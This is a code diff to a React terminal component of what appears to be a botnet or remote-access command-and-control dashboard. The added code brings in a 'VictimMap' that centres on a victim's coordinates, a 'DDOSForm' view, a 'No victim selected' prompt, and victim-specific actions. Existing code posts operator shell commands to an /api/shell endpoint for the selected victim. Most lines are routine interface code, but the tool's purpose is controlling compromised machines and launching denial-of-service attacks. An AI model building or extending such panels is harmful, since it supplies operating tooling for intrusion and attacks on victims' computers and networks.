@@ -1,32 +1,69 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { User } from '@/Interfaces/User';
+import Split from 'react-split';
+import { Map, BarChart3, Terminal as TerminalIcon, ComputerIcon } from 'lucide-react';
+import { useUserStore } from '@/Stores/UserStore';
 import { executeCommand, initializeModules, getModules } from '@/Modules/commandRegistry';
 import { Autocomplete } from './Autocomplete';
 import GraphicalActions from './GraphicalActions';
+import VictimMap from './VictimMap';
+import DetailedStats from './DetailedStats';
+import { DDOSForm } from './DDOSForm';
 
-interface TerminalProps {
-  selectedUser: User;
-  setModules: (modules: Record<string, any>) => void; // Callback to pass modules to AdminPanel
-}
+type ViewType = 'map' | 'stats' | 'actions' | 'computer';
 
-export const Terminal: React.FC<TerminalProps> = ({ selectedUser, setModules }) => {
+export const Terminal: React.FC = () => {
+  const { selectedUser, users } = useUserStore();
   const [input, setInput] = useState('');
   const [output, setOutput] = useState<string[]>([]);
   const [isFocused, setIsFocused] = useState(false);
   const [position, setPosition] = useState({ top: 0, left: 0 });
   const inputRef = useRef<HTMLInputElement>(null);
-  const [modules, setLocalModules] = useState<Record<string, any>>({});
+  const [modules, setModules] = useState<Record<string, any>>({});
   const outputRef = useRef<HTMLDivElement | null>(null);
   const [history, setHistory] = useState<string[]>([]);
   const [historyIndex, setHistoryIndex] = useState<number>(-1);
   const [isAutocompleteVisible, setIsAutocompleteVisible] = useState(false);
+  const [currentView, setCurrentView] = useState<ViewType>('map');
+
+  // ViewSwitcher Component
+  const ViewSwitcher = () => {
+    const views = [
+      { id: 'map' as ViewType, icon: <Map size={20} />, name: 'Map View' },
+      { id: 'stats' as ViewType, icon: <BarChart3 size={20} />, name: 'Statistics' },
+      { id: 'actions' as ViewType, icon: <TerminalIcon size={20} />, name: 'Actions' },
+      { id: 'computer' as ViewType, icon: <ComputerIcon size={20} />, name: 'Computer' },
+    ];
+
+    return (
+      <div className="bg-gray-700/50 p-1.5 rounded-lg flex justify-center mb-4">
+        <div className="inline-flex rounded-md bg-gray-800/50 p-1 gap-1">
+          {views.map((view) => (
+            <button
+              key={view.id}
+              id={"button-"+view.id}
+              onClick={() => setCurrentView(view.id)}
+              className={`
+                flex items-center px-3 py-1.5 rounded
+                transition-all duration-200 ease-in-out
+                ${currentView === view.id 
+                  ? 'bg-blue-500 text-white shadow-lg' 
+                  : 'text-gray-400 hover:text-white hover:bg-gray-700'}
+              `}
+              title={view.name}
+            >
+              {view.icon}
+            </button>
+          ))}
+        </div>
+      </div>
+    );
+  };
 
   useEffect(() => {
     initializeModules();
     const loadedModules = getModules();
-    setLocalModules(loadedModules); // Save locally for this component
-    setModules(loadedModules); // Pass modules to AdminPanel
-  }, [setModules]);
+    setModules(loadedModules);
+  }, []);
 
   useEffect(() => {
     if (outputRef.current) {
@@ -34,6 +71,7 @@ export const Terminal: React.FC<TerminalProps> = ({ selectedUser, setModules }) 
     }
   }, [output]);
 
+  // Your existing handlers (handleInputChange, handleKeyDown, etc.)...
   const handleInputChange = (event: React.ChangeEvent<HTMLInputElement>) => {
     setInput(event.target.value);
     if (event.target.value.startsWith('/')) {
@@ -110,13 +148,13 @@ export const Terminal: React.FC<TerminalProps> = ({ selectedUser, setModules }) 
 
         addOutput(`> ${trimmedInput}`);
         if (trimmedInput.startsWith('/')) {
-          executeCommand(selectedUser, trimmedInput, addOutput);
+          executeCommand(selectedUser!, trimmedInput, addOutput); // Use selected user from store
         } else {
           try {
             const response = await fetch('http://localhost:8000/api/shell', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ command: trimmedInput, id: selectedUser.uuid }),
+              body: JSON.stringify({ command: trimmedInput, id: selectedUser?.uuid }),
             });
 
             if (!response.ok) {
@@ -151,10 +189,53 @@ export const Terminal: React.FC<TerminalProps> = ({ selectedUser, setModules }) 
     }, 200);
   };
 
+  if (!selectedUser) {
+    return (
+      <div className="h-full flex items-center justify-center">
+        <p>No victim selected. Please select a victim from the list.</p>
+      </div>
+    );
+  }
+
+  const renderCurrentView = () => {
+    switch (currentView) {
+      case 'map':
+        return <VictimMap defaultCenter={[selectedUser.longitude, selectedUser.latitude]}/>;
+      case 'stats':
+        return <DetailedStats />;
+      case 'actions':
+        return (
+          <GraphicalActions
+            selectedUser={selectedUser}
+            addOutput={addOutput}
+            setModules={setModules}
+          />
+        );
+      case 'computer':
+        return (<DDOSForm />);
+
+      default:
+        return null;
+    }
+  };
+
   return (
-    <div className="h-full max-h-full flex flex-col space-y-2">
-      <GraphicalActions selectedUser={selectedUser} addOutput={addOutput} setModules={setModules}  />
-      <div className="flex flex-col bg-gray-900 text-white p-4 rounded-lg space-y-2 flex-grow overflow-hidden h-1/2 max-h-1/2">
+    <Split
+      className="flex flex-col h-full"
+      sizes={[40, 60]}
+      minSize={100}
+      gutterSize={10}
+      gutterAlign="center"
+      direction="vertical"
+    >
+      <div className="bg-gray-800 p-4 rounded-lg overflow-auto">
+        <ViewSwitcher />
+        <div className="h-[calc(100%-3rem)] overflow-auto">
+          {renderCurrentView()}
+        </div>
+      </div>
+
+      <div className="flex flex-col bg-gray-900 text-white p-4 rounded-lg space-y-2 flex-grow overflow-hidden">
         <div ref={outputRef} className="output h-full overflow-y-auto flex-grow">
           {output.map((line, index) => (
             <div key={index}>{line}</div>
@@ -186,7 +267,7 @@ export const Terminal: React.FC<TerminalProps> = ({ selectedUser, setModules }) 
           />
         </div>
       </div>
-    </div>
+    </Split>
   );
 };
 
